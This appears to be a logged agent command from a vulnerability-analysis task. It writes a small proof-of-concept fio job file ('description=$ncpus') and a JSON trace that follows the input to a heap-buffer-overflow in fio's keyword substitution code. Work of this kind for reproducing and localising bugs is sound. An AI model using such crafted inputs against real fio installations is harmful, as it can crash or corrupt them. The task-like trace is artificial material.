message:
Command `cd /workspace/repo-vul/src-vul/fio && python3 - <<'PY'
from pathlib import Path
p=Path('poc.bin')
p.write_bytes(b'[global]\ndescription=$ncpus\n')
print(p.resolve(), p.stat().st_size)
PY
cat > /workspace/candidate_trace.json <<'JSON'
[
  {"step":1,"file":"init.c","function":"__parse_jobs_ini","line":1895,"var":"p","code":"p = strsep(&file, \"\\n\");","note":"The INI parser reads the attacker-controlled job text line by line from the input buffer."},
  {"step":2,"file":"init.c","function":"__parse_jobs_ini","line":1960,"var":"opts[num_opts]","code":"opts[num_opts] = strdup(p);","note":"The option line description=$ncpus is duplicated into the per-job option array for later parsing."},
  {"step":3,"file":"options.c","function":"fio_options_parse","line":5195,"var":"opts_copy","code":"opts_copy = dup_and_sub_options(opts, num_opts);","note":"fio_options_parse makes a mutable copy of each option string before keyword substitution."},
  {"step":4,"file":"options.c","function":"dup_and_sub_options","line":5149,"var":"opts_copy[i]","code":"opts_copy[i] = fio_option_dup_subs(opts[i]);","note":"Each option string is duplicated so fio_keyword_replace can edit it in place."},
  {"step":5,"file":"options.c","function":"fio_keyword_replace","line":5102,"var":"s","code":"while ((s = strstr(opt, kw->word)) != NULL) {","note":"The replacement logic finds the $ncpus keyword inside the attacker-controlled description value."},
  {"step":6,"file":"options.c","function":"fio_keyword_replace","line":5112,"var":"opt","code":"opt += strlen(kw->word) + olen;","note":"When the keyword is not at the start of the string, opt is advanced to a later position inside the original buffer."},
  {"step":7,"file":"options.c","function":"fio_keyword_replace","line":5116,"var":"memcpy(new + olen + len, opt, opt - o_org - 1);","code":"if (strlen(opt)) memcpy(new + olen + len, opt, opt - o_org - 1);","note":"The copy length is computed from the shifted opt pointer and becomes inconsistent with the source region, causing a heap-buffer-overflow during keyword substitution."},
  {"step":8,"file":"options.c","function":"fio_options_parse","line":5198,"var":"newret","code":"parse_option(opts_copy[i], opts[i], fio_options, &o, &td->o, &td->opt_list);","note":"Parsing continues with the corrupted substituted option string, exercising the overflow in the sink path."}
]
JSON
ls -l poc.bin /workspace/candidate_trace.json && cat /workspace/candidate_trace.json` executed with exit code 0.
